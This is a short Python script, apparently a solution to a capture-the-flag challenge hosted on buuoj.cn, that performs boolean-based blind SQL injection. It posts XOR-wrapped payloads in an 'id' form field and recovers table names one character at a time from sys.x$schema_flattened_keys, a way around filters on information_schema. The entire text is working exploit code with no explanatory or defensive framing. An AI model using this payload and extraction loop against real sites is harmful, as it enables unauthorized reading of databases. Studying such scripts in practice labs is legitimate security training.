import requests

url = "http://d2b14591-3332-4e6b-b026-6d2730a8d688.node3.buuoj.cn/"

flag = ""

payload = "1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{},1))={})^1"

for i in range(1,100):
    for j in range(32,133):
        py = payload.format(i,j)
        data = {"id": py}
        r = requests.post(url=url,data=data)
        if "Nu1L" in r.text:
            flag += chr(j)
            print(flag)
            break